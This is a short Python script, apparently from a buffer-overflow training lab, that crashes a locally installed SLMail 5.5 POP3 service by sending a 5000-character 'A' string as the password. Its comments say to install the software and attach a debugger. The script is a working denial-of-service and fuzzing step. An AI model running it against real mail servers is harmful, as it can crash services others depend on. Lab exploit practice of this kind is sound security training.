#!/usr/bin/python 
import struct
import socket
 

 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Just trying to seee if we can successfully crash the server
# Be sure to install SLMail 5.5 from https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe
# After the install be sure to start the service
# net start slmail (from command prompt run as admin)
# Also, be sure to open up OllyDBG as admin


buffer = "A" * 5000
try:
    print "\nSending the exploit..."
    s.connect(('127.0.0.1',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    data = s.recv(1024)
    s.close()
    print "\nDone!"
except:
    print "Could not connect to POP3!"
